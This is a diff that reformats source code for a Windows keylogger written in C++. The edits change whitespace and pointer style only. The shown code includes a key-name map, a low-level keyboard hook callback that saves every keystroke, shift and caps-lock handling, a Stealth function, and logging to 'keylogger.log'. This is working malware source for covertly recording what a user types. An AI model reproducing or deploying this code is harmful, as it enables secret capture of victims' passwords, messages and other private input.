@@ -18,36 +18,36 @@
 // or you will get problems since every function uses this variable.
 
 #if FORMAT == 0
-const std::map<int, std::string> keyname{ 
-	{VK_BACK, "[BACKSPACE]" },
-	{VK_RETURN,	"\n" },
-	{VK_SPACE,	"_" },
-	{VK_TAB,	"[TAB]" },
-	{VK_SHIFT,	"[SHIFT]" },
-	{VK_LSHIFT,	"[LSHIFT]" },
-	{VK_RSHIFT,	"[RSHIFT]" },
-	{VK_CONTROL,	"[CONTROL]" },
-	{VK_LCONTROL,	"[LCONTROL]" },
-	{VK_RCONTROL,	"[RCONTROL]" },
-	{VK_MENU,	"[ALT]" },
-	{VK_LWIN,	"[LWIN]" },
-	{VK_RWIN,	"[RWIN]" }, 
-	{VK_ESCAPE,	"[ESCAPE]" },
-	{VK_END,	"[END]" },
-	{VK_HOME,	"[HOME]" },
-	{VK_LEFT,	"[LEFT]" },
-	{VK_RIGHT,	"[RIGHT]" },
-	{VK_UP,		"[UP]" },
-	{VK_DOWN,	"[DOWN]" },
-	{VK_PRIOR,	"[PG_UP]" },
-	{VK_NEXT,	"[PG_DOWN]" },
-	{VK_OEM_PERIOD,	"." },
-	{VK_DECIMAL,	"." },
-	{VK_OEM_PLUS,	"+" },
-	{VK_OEM_MINUS,	"-" },
-	{VK_ADD,		"+" },
-	{VK_SUBTRACT,	"-" },
-	{VK_CAPITAL,	"[CAPSLOCK]" },
+const std::map<int, std::string> keyname{
+	{VK_BACK, "[BACKSPACE]"},
+	{VK_RETURN, "\n"},
+	{VK_SPACE, "_"},
+	{VK_TAB, "[TAB]"},
+	{VK_SHIFT, "[SHIFT]"},
+	{VK_LSHIFT, "[LSHIFT]"},
+	{VK_RSHIFT, "[RSHIFT]"},
+	{VK_CONTROL, "[CONTROL]"},
+	{VK_LCONTROL, "[LCONTROL]"},
+	{VK_RCONTROL, "[RCONTROL]"},
+	{VK_MENU, "[ALT]"},
+	{VK_LWIN, "[LWIN]"},
+	{VK_RWIN, "[RWIN]"},
+	{VK_ESCAPE, "[ESCAPE]"},
+	{VK_END, "[END]"},
+	{VK_HOME, "[HOME]"},
+	{VK_LEFT, "[LEFT]"},
+	{VK_RIGHT, "[RIGHT]"},
+	{VK_UP, "[UP]"},
+	{VK_DOWN, "[DOWN]"},
+	{VK_PRIOR, "[PG_UP]"},
+	{VK_NEXT, "[PG_DOWN]"},
+	{VK_OEM_PERIOD, "."},
+	{VK_DECIMAL, "."},
+	{VK_OEM_PLUS, "+"},
+	{VK_OEM_MINUS, "-"},
+	{VK_ADD, "+"},
+	{VK_SUBTRACT, "-"},
+	{VK_CAPITAL, "[CAPSLOCK]"},
 };
 #endif
 HHOOK _hook;
@@ -69,7 +69,7 @@ LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
 		if (wParam == WM_KEYDOWN)
 		{
 			// lParam is the pointer to the struct containing the data needed, so cast and assign it to kdbStruct.
-			kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
+			kbdStruct = *((KBDLLHOOKSTRUCT *)lParam);
 
 			// save to file
 			Save(kbdStruct.vkCode);
@@ -99,12 +99,11 @@ void ReleaseHook()
 	UnhookWindowsHookEx(_hook);
 }
 
-
 int Save(int key_stroke)
 {
 	std::stringstream output;
 	static char lastwindow[256] = "";
-#ifndef mouseignore 
+#ifndef mouseignore
 	if ((key_stroke == 1) || (key_stroke == 2))
 	{
 		return 0; // ignore mouse clicks
@@ -157,8 +156,7 @@ int Save(int key_stroke)
 		bool lowercase = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);
 
 		// check shift key
-		if ((GetKeyState(VK_SHIFT) & 0x1000) != 0 || (GetKeyState(VK_LSHIFT) & 0x1000) != 0
-			|| (GetKeyState(VK_RSHIFT) & 0x1000) != 0)
+		if ((GetKeyState(VK_SHIFT) & 0x1000) != 0 || (GetKeyState(VK_LSHIFT) & 0x1000) != 0 || (GetKeyState(VK_RSHIFT) & 0x1000) != 0)
 		{
 			lowercase = !lowercase;
 		}
@@ -196,7 +194,7 @@ void Stealth()
 int main()
 {
 	// open output file in append mode
-	const char* output_filename = "keylogger.log";
+	const char *output_filename = "keylogger.log";
 	std::cout << "Logging output to " << output_filename << std::endl;
 	output_file.open(output_filename, std::ios_base::app);
 
